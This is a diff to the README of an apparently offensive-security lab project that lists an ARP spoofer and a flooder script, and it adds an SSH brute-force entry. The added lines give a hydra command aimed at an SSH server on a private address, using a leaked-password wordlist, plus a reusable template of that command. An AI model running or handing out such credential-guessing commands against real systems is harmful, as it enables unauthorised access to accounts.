@@ -6,3 +6,11 @@ The structure of the project is the following one.
  - **Arp-Spoofer**: 
 
  - **flooder.py**: 
+ 
+ - **ssh brute force**: The tool used is hydra. The test command used is the following one.
+ 
+```
+./hydra -s 22 -v -V -l fran -P ../SecLists/Passwords/darkweb2017-top1000.txt -t 8 192.168.1.10 ssh
+
+./hydra -s <port> -v -V -l <username> -P <path to password file> -t <number of threads> <ip> <protocol>
+```
